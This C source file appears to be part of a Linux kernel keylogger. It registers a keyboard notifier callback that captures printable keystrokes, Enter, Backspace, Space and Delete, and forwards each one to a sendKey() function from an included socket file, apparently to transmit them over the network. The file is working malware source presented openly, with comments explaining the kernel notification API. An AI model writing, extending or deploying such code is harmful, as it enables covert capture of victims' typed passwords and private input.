/*
    * This file contains a functions can listenint the keyboard imput. 
    * Works whit Notification Chains in Kernel Linux -> More info /include/linux/notifier.h and /include/linux/keyboard.h
    * It's essentially based upon a publish-and-subscribe model. 
    * The subscriber is the component that wants to know when a given asynchronous event occurs.
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include "socket.c"

// ! Format pr_info
#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__ 

/* Prototypes */
static void connect_keyboard_notifier(void);
static void disconnect_keyboard_notifier(void);
/* Callback function for the keyboard notification chain. */
static int keys_pressed(struct notifier_block *notifierBlock, unsigned long action, void *data);

/* Prototypes other files */
static int sendKey(char* key);

// Data
/*
    * linux/notifier.h 
    * struct notifier_block 
    ? - notifier_fn_t notifier_call; -> Pointer to callback.
    ? - struct notifier_block __rcu *next; -> Chain of callbacks, kernel configure this whit exclusions.
    ? - int priority; -> Priority of function.

*/
/* /include/linux/notifier.h */
static struct notifier_block notifierBlock = {
    .notifier_call = keys_pressed
};

static int keys_pressed(struct notifier_block *notifierBlock, unsigned long action, void *data){
    /*
        * keys_pressed params
        ? - *notifierBlock -> The currently notifier_block called.
        ? - action         -> Indicate the type of event occurred.
        ? - *data          -> Pointer to pass extra information about the event ocurred (struct keyboard_notifier_param) .
    */
    /*  - Action /include/linux/notifier.h
        * KBD_KEYCODE	    	0x0001 -> Keyboard keycode, called before any other .
        * KBD_UNBOUND_KEYCODE	0x0002 -> Keyboard keycode which is not bound to any other .
        * KBD_UNICODE		    0x0003 -> Keyboard unicode.
        * KBD_KEYSYM		    0x0004 -> Keyboard keysym (No Unicode like as ASCII).
        * KBD_POST_KEYSYM	    0x0005 -> Called after keyboard keysym interpretation .
    */
    /*  - linux/include/linux/keyboard.h -> struct keyboard_notifier_param 
        ? - struct vc_data *vc;	 -> VC on which the keyboard press was done .
        ? - int down;            -> Pressure of the key (1 press the ke , 0 release the key) *.
        ? - int shift;	         -> Current shift mask .
        ? - int ledstate;		 -> Current led state .
        ? - unsigned int value;	 -> keycode, unicode value or keysym *.
    */

    /*Cast data to keyboard_notifier_param*/
    struct keyboard_notifier_param *keyboardInfo = data; 

    /*Check no unicode and key pressed*/
    if(action == KBD_KEYSYM && keyboardInfo->down){
        char key = keyboardInfo->value;
        /*Check ASCII code*/
        switch (key){
            case 0x00: /* Nul -> Null byte */
                #if verbose == 1
                    pr_info("Pressed Nul -> %c\n",key);
                #endif
                //sendKey(key);
                break;

            case 0x01: /* SOH -> Start of Header */
                #if verbose == 1
                    pr_info("Pressed SOH -> %c\n",key);
                #endif
                //sendKey(&key);
                break;

            case 0x08: /* BS -> Backspace (delete key) */
                #if verbose == 1
                    pr_info("Pressed BS -> %c\n",key);
                #endif
                sendKey(&key);
                break;

            case 0x0A: /* NL -> New Line */
                #if verbose == 1
                    pr_info("Pressed NL -> %c\n",key);
                #endif
                //sendKey(&key);
                break;

            case 0x0D: /* CR -> Carriage return (Enter) */
                #if verbose == 1
                    pr_info("Pressed CR -> %c\n",key);
                #endif
                sendKey(&key);
                break;

            case 0x1B: /* ESC -> Escape */
                #if verbose == 1
                    pr_info("Pressed ESC -> %c\n",key);
                #endif
                //sendKey(&key);
                break;

            case 0x20: /* SP -> Space */
                #if verbose == 1
                    pr_info("Pressed SP -> %d\n",key);
                #endif
                sendKey(&key);
                break;

            case 0x7F: /* Del -> Sup */
                #if verbose == 1
                    pr_info("Pressed Del -> %c\n",key);
                #endif
                sendKey(&key);
                break;

            default:
                if(key >= 0x20   && key <= 0x7f) /* ASCII code */
                {
                    #if verbose == 1
                        pr_info("Pressed %c\n",key);
                    #endif
                    sendKey(&key);
                }
        }
    }

    /* - return -> linux/include/linux/notifier.h
    * NOTIFY_DONE  // Dont care -> Not interested in the notification.     
    * NOTIFY_OK    // Suits me  -> Notification was processed correctly.
    * NOTIFY_STOP  // Clean way to return from the notifier and stop further calls. -> Routine invoked correctly. However, no further callbacks need to be called for this event.
    * NOTIFY_STOP_MASK // Dont call further 
    * NOTIFY_BAD   // Bad/Veto action -> Something went wrong. Stop calling the callback routines for this event.
    */
    return NOTIFY_OK;

}

static void connect_keyboard_notifier(){
    int ret = register_keyboard_notifier(&notifierBlock);
    #if verbose == 1
        if(ret){
            pr_info("Error when connecting to the keyboard notification chain \n");
        }
        else{
            pr_info("Connect keyboard notifier sucesfully \n");
        }   
    #endif
}

static void disconnect_keyboard_notifier(){
    int ret = unregister_keyboard_notifier(&notifierBlock);
    #if verbose == 1
        if(ret){
            pr_info("Disconnect keyboard notifier error \n");
        }
        else{
            pr_info("Disconnect keyboard notifier sucesfully \n");
        }
    #endif
}